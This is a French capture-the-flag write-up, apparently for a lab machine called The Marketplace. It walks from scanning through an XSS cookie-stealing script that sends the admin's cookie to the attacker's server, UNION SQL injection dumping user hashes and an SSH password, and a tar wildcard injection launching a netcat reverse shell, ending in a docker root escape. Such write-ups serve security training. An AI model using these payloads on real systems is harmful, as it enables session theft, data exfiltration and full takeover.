# The Marketplace

### Nmap | Scan

```bash
sudo nmap -sC -sV -oN -o enum/nmap -vv $ip

22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c83cc56265eb7f5d9224e93b11b523b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1
|   256 06b799940b091439e17fbfc75f99d39f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=
|   256 0a75bea260c62b8adf4f457161ab60b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar
80/tcp    open  http    syn-ack ttl 62 nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
32768/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
|_http-title: The Marketplace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin
```

## Port 80 | HTTP

### **Gobuster | Énumération**

```bash
gobuster dir -u http://10.10.36.15/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o enum/medium.txt

/images               (Status: 301) [Size: 179] [--> /images/]
/new                  (Status: 302) [Size: 28] [--> /login]
/login                (Status: 200) [Size: 857]
/signup               (Status: 200) [Size: 667]
/admin                (Status: 403) [Size: 392]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/New                  (Status: 302) [Size: 28] [--> /login]
/NEW                  (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 403) [Size: 392]
/Signup               (Status: 200) [Size: 667]
/SignUp               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
/Messages             (Status: 302) [Size: 28] [--> /login]
/signUp               (Status: 200) [Size: 667]
/LogIn                (Status: 200) [Size: 857]
/LOGIN                (Status: 200) [Size: 857]
```

### **Voler les cookies de l’administrateur**

Quand nous créons un nouvel item, l’input est vulnérable à une XSS

![Untitled](https://user-images.githubusercontent.com/68467919/207140405-9b02edc6-f8f1-43c3-9b31-3986e7c4a300.png)

En créant un petit script, nous pourrions rediriger l’administrateur et report notre propre item pour qu’il puisse être redirigé vers notre serveur web pour voler ses cookies.

```html
<script>
        window.location="http://$ip:1337/cookies?=".concat(document.cookie);
</script>
```

Je vais donc report un autre item puis modifier dans le code source la destination de mon vrai payload 

![Untitled 1](https://user-images.githubusercontent.com/68467919/207140444-31b30935-364d-4f5f-8bef-4cbf8aee11fc.png)

Sur mon serveur web, je reçois bien le cookie de l’administrateur

![Untitled 2](https://user-images.githubusercontent.com/68467919/207140488-18ef5f7c-a994-4979-b230-3d23dfd7925b.png)

![Untitled 3](https://user-images.githubusercontent.com/68467919/207140510-e4d9b188-d2c1-47b1-bb67-f154c7498f00.png)

En changeant la valeur de mon cookie, je suis désormais connecté sur le compte de l’administrateur

## Flag 1 | Administration panel

![Untitled 5](https://user-images.githubusercontent.com/68467919/207140669-a6630763-e2ee-4457-bfbc-a588516e3888.png)

### SQL Injection | Administration panel

Non seulement nous récupérons le premier flag dans /admin mais en plus de ça, les id sont vulnérables à une injection SQL

![Untitled 6](https://user-images.githubusercontent.com/68467919/207140699-6d383b64-70f6-4192-8920-d8c849cf26c7.png)


Définissons le nombre de colonnes qui se trouvent dans la base de donnée courante.

```sql
2 UNION SELECT NULL,NULL,NULL,NULL -- -
```

Après avoir cherché où les données pouvaient être reflétées, j’ai remarqué qu’en changeant le dernier “NULL” par une string ou un int, le “is administrator” changeait de valeur. J’ai pensé à une BLIND Sqli, mais en essayant pas mal de payloads, rien ne fonctionnait.

En mettant un id supérieur au nombre d’utilisateur, il est possible d’avoir un retour visuel.

```sql
http://10.10.36.15/admin?user=5 UNION SELECT "a","b","c","d" -- -
```
![Untitled 7](https://user-images.githubusercontent.com/68467919/207140730-a8545b45-9316-40a0-ae86-88fcb7cbba76.png)

### Nom de la base de donnée

```sql
5 UNION SELECT "a",database(),"c","d" -- -

User marketplace
ID: a
Is administrator: true
```

### Nom des tables

```sql
5 UNION SELECT "a",group_concat(table_name),"c","d" FROM information_schema.tables WHERE table_schema="marketplace" -- -

User items,messages,users
ID: a
Is administrator: true
```

### Nom des colonnes

```sql
5 UNION SELECT "a",group_concat(column_name),"c","d" FROM information_schema.columns WHERE table_name="users" -- -

User id,isAdministrator,password,username
ID: a
Is administrator: true
```

### Dump les données

```sql
5 UNION SELECT "a",group_concat(id,":",isAdministrator,":",username,":",password),"c","d" from users -- -

User 1:0:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,
2:1:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,
3:1:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,
4:0:b0unce:$2b$10$.FVPYj2y8rHndOV.tXlLXOC3XMKhTuKpOqY1u4ReIeKfWKpZVBISu
```

Après avoir essayé de cracker les différents mot de passe des utilisateurs, ça n’a rien donné. Une table est restante, “messages”.

```sql
5 UNION SELECT "a",group_concat(column_name),"c","d" FROM information_schema.columns WHERE table_name="messages" -- -

User id,is_read,message_content,user_from,user_to
ID: a
Is administrator: true
```

```sql
5 UNION SELECT "a",group_concat(message_content,":",user_from,":",user_to),"c","d" FROM messages-- -

Hello! An automated system has detected your SSH password is too weak and needs to 
be changed. You have been generated a new temporary password. 
Your new password is: @b_ENXkGYUCAv3zJ:1:3
```

Donc ce que je comprends ici, c’est que l’utilisateur system envoi ce message à l’utilisateur jake (id:3) en lui envoyant son nouveau mot de passe pour se connecter en SSH à la machine.

## SSH | Jake

### **Flag 2 | Jake**

![Untitled 8](https://user-images.githubusercontent.com/68467919/207140750-78a017b4-6e5e-47f4-9a1c-9469c7cab8e7.png)

### Énumération

![Untitled 9](https://user-images.githubusercontent.com/68467919/207140771-e46e59d7-f62c-4dee-98fc-0f15a7104e14.png)

Nous pouvons donc exécuter un script sans utiliser de mot de passe sous l’utilisateur michael.

### [backup.sh](http://backup.sh) | Wildcard Injection

```sql
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

Tar va créer une archive de n’importe quel fichier , n’importe où dû au wildcard.

Pour pouvoir s’élever en privilège, nous pouvons se fier à cet article : 

[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

Pour faire simple : 

```sql
--checkpoint[=NUMBER] :
Affiche un message de progression tous les NUMBER (par défaut 10).

--checkpoint-action=ACTION :
Exécute ACTION à chaque point de contrôle, dans notre cas exec.

exec=command : Exécute la commande donnée.
```

### Exploit

```bash
Machine distante : 

chmod 777 /opt/backups/backup.tar

cd /tmp

echo "mkfifo /tmp/lhennp; nc $ip 1337 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

chmod 777 lhennp

sudo -u michael /opt/backups/backup.sh

Machine attaquante : 

nc -lvnp 1337
```

![Untitled 10](https://user-images.githubusercontent.com/68467919/207140809-eff8b7d3-44a1-40fc-baa4-2c0611515f85.png)

## Docker | Root

Quand nous regardons dans quel groupe nous appartenons, nous pouvoir voir que nous sommes dans le groupe docker.

![Untitled 11](https://user-images.githubusercontent.com/68467919/207140910-de8be41e-f4e4-4b52-b0fd-11149ecc4aa3.png)

Sur GTFOBins, la première commande nous permet de pouvoir nous élever en tant que root.

![Untitled 12](https://user-images.githubusercontent.com/68467919/207140931-e4664bbb-dcf1-487d-9e42-63d73cdcce67.png)

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![Untitled 13](https://user-images.githubusercontent.com/68467919/207140952-9f277032-0784-4c8f-8dd3-78becb7fc152.png)

ROOTED
